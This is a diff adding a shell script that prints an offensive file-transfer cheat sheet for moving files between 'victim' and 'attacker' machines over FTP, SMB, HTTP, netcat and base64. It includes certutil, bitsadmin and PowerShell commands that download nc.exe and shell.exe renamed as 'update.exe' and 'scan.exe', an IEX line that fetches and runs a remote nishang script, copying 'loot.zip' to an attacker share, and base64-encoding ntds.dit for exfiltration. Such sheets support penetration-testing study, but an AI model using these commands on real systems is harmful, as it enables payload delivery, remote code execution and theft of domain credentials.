@@ -1,0 +1,138 @@
+echo -e "--------------------------------------------------------------------------------------\n\n# File Transfer Cheat Sheet\n"
+
+echo "--------------------------------------------------------------------------------------"
+cat <<eof
+## SSH (Secure FTP)
+
+sftp $USER@$RHOST
+	get filename
+	put filename
+
+--------------------------------------------------------------------------------------
+## FTP
+### Use A Remote FTP Server
+
+ftp $RHOST
+ftp -p $RHOST
+	get filename
+	put filename
+
+	prompt off
+	mget *
+0r
+
+(web browser "firefox" in URL)
+	ftp://$RHOST
+	ftp://$RHOST:$RPORT
+0r
+
+wget -m ftp://$RHOST/
+wget -m ftp --user='$USER' --password='$PW' ftp://$RHOST/
+
+### Host a quick FTP on LHOST to transfer files from victim to attacker machine
+
+sudo apt install python-pyftpdlib-doc python3-pyftpdlib
+0r
+pip3 install pyftpdlib --user
+
+python3 -m pyftpdlib
+sudo python3 -m pyftpdlib -p 21
+
+ftp $LHOST 2121
+ftp $LHOST
+
+--------------------------------------------------------------------------------------
+## SMB
+### Remote SMB Server
+
+smbclient //$RHOST/share -U '' -N
+smbclient //$RHOST/share -U $USER
+	get file
+	put file
+0r
+	recurse on
+	prompt off
+
+	mget *
+	mget folder \\
+
+### Host Local SMB Server With Impacket
+
+mkdir local_smb
+impacket-smbserver local ./local_smb -smb2support
+
+net view \\$LHOST\local
+
+copy \\$LHOST\local\sploit.exe .\sploit.exe
+0r
+copy loot.zip \\$LHOST\local\loot.zip
+
+--------------------------------------------------------------------------------------
+## Download Files With Web Requests
+
+### Host A local File Server on LHOST
+
+python3 -m http.server
+sudo python3 -m http.server 80
+
+sudo php -S $LHOST:80
+sudo php -S $LHOST:$LPORT
+
+sudo npm install http-server -g
+	http-server
+	http-server -p 80
+
+### Download Web Hosted Files From Linux Box
+
+wget http://$LHOST/$LPORT/filename.txt
+curl http://$LHOST/$LPORT/file.txt -o output.txt
+
+### Download Web HOsted Files From Windows Box
+
+certutil -urlcache -f http://$LHOST/$LPORT/nc.exe C:\Windows\Temp\nc.exe
+certutil -urlcache -f http://$LHOST/$LPORT/nc.exe nc.exe
+
+bitsadmin /transfer n http://$LHOST/$LPORT/file.txt C:\Users\Public\file.txt
+
+curl http://$LHOST/$LPORT/file.txt -o output.txt
+
+powershell -c "Invoke-WebRequest -Uri 'http://$LHOST:$LPORT/shell.exe' -OutFile 'update.exe'
+powershell "IEX(New-Object System.Net.WebClient).Downloadfile('http://$LHOST:$LPORT/shell.exe','scan.exe')"
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://$LHOST:$LPORT/nishang.ps1')"
+
+--------------------------------------------------------------------------------------
+## NetCat File Transfer
+
+1. Setup listener on the box you want to download t
+	nc -lvnp 9001 > write.file
+
+2. A second nc command to send the file (make sure not to empty it by mistake)
+	nc -w 3 $RHOST 9001 < linpeas.sh
+0r
+	nc -w 3 $LHOST < linpeas.sh
+	
+--------------------------------------------------------------------------------------
+## Base64 0r Other Decode File Transfer
+### Linux Box
+
+base64 filename
+
+echo "<base64-encoded-string>" | base64 -d > filename
+cat b64.txt | base64 -d > filename
+
+### Windows Box
+
+certutil -encode data.txt encoded.b64
+certutil -decode b64.txt payload.exe
+
+powershell -ep bypass
+$file = ".\b64.txt"
+$data = Get-Content $file
+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data)) 
+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data)) | Out-File -Encoding "ASCII" filename.txt
+
+powershell -c "[convert]::ToBase64String((Get-Content -path '.\ntds.dit' -Encoding byte))"
+
+--------------------------------------------------------------------------------------
+eof
